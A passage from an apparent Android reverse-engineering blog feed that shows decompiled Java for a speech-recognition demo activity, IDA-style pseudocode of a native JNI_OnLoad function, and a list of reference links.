InitListener() {        public void onInit(int code) {            Log.d(MainActivity.this.TAG, &quot;SpeechRecognizer init() code = &quot; + code);        }    };    private SynthesizerListener mSynListener = new SynthesizerListener() {        public void onCompleted(SpeechError error) {        }        public void onBufferProgress(int percent, int beginPos, int endPos, String info) {        }        public void onSpeakBegin() {            Log.d(MainActivity.this.TAG, &quot;speakcheck&quot;);        }        public void onSpeakPaused() {        }        public void onSpeakProgress(int percent, int beginPos, int endPos) {        }        public void onSpeakResumed() {        }        public void onEvent(int arg0, int arg1, int arg2, Bundle arg3) {        }    };    private SpeechSynthesizer mTts;    private RecognizerListener recognizerListener = new RecognizerListener() {        public void onBeginOfSpeech() {        }        public void onError(SpeechError error) {        }        public void onEndOfSpeech() {        }        public void onResult(RecognizerResult results, boolean isLast) {            Log.d(MainActivity.this.TAG, results.getResultString());            try {                MainActivity.this.ss = new JSONObject(results.getResultString()).getJSONArray(&quot;ws&quot;).getJSONObject(0).getJSONArray(&quot;cw&quot;).getJSONObject(0).getString(&quot;w&quot;);            } catch (Exception e) {                Log.d(MainActivity.this.TAG, &quot;catch Excepetion&quot;);            }            if (MainActivity.this.ss.equals(&quot;\u4f60\u597d&quot;)) { // 你好                MainActivity.this.getsna();            }            Log.d(MainActivity.this.TAG, MainActivity.this.ss);        }        public void onVolumeChanged(int volume, byte[] var2) {        }        public void onEvent(int eventType, int arg1, int arg2, Bundle obj) {        }    };    private JSONObject res;    private String ss;    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(new background(this));        this.mAudioManager = (AudioManager) getSystemService(&quot;audio&quot;);        this.mAudioManager.setBluetoothScoOn(true);        this.mAudioManager.startBluetoothSco();        SpeechUtility.createUtility(this, &quot;appid=561e6833&quot;);        this.mIat = SpeechRecognizer.createRecognizer(this, this.mInitListener);        this.mTts = SpeechSynthesizer.createSynthesizer(this, null);    }    public void setParam() {        this.mIat.setParameter(SpeechConstant.DOMAIN, &quot;iat&quot;);        this.mIat.setParameter(SpeechConstant.LANGUAGE, &quot;zh_cn&quot;);        this.mIat.setParameter(SpeechConstant.ACCENT, &quot;mandarin&quot;);    }    public void getsna() {        Toast.makeText(this, &quot;haha&quot;, 0).show();    }    protected void onDestroy() {        super.onDestroy();        this.mAudioManager.setBluetoothScoOn(false);        this.mAudioManager.stopBluetoothSco();    }}</code></pre><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *vm){  jclass v2; // r4  _JNIEnv *env; // [sp+4h] [bp-Ch]  env = 0;  if ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (void **)&amp;env, 65540) )    return -1;  if ( byte_FF45C )    _android_log_write(3, &quot;MSC_LOG&quot;, &quot;JNI_OnLoad is called !&quot;);  v2 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, &quot;java/io/FileDescriptor&quot;);  if ( !v2 &amp;&amp; byte_FF45C )    _android_log_write(3, &quot;MSC_LOG&quot;, &quot;Unable to find Java class java.io.FileDescriptor&quot;);  dword_FFC14 = (int)env-&gt;functions-&gt;GetFieldID(&amp;env-&gt;functions, v2, &quot;descriptor&quot;, &quot;I&quot;);  if ( dword_FFC14 || !byte_FF45C )             // get descriptor in FileDescriptor and judge    return 65540;  _android_log_write(3, &quot;MSC_LOG&quot;, &quot;Unable to find descriptor field in java.io.FileDescriptor&quot;);  return 65540;}</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.jianshu.com/p/a2f826064e29" target="_blank" rel="noopener">https://www.jianshu.com/p/a2f826064e29</a><br><a href="https://blog.csdn.net/jscese/article/details/51005447" target="_blank" rel="noopener">https://blog.csdn.net/jscese/article/details/51005447</a><br><a href="https://blog.csdn.net/zhuzhuzhu22/article/details/80306203" target="_blank" rel="noopener">https://blog.csdn.net/zhuzhuzhu22/article/details/80306203</a><br><a href="https://blog.csdn.net/ldpxxx/article/details/9253369" target="_blank" rel="noopener">https://blog.csdn.net/ldpxxx/article/details/9253369</a><br><a href="https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hex" target="_blank" rel="noopener">https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hex</a><br><a href="https://www.52pojie.cn/thread-1105062-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1105062-1-1.html</a><br><a href="https://blog.csdn.net/jason0539/article/details/10049899" target="_blank" rel="noopener">https://blog.csdn.net/jason0539/article/details/10049899</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;持续更新。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
</feed>
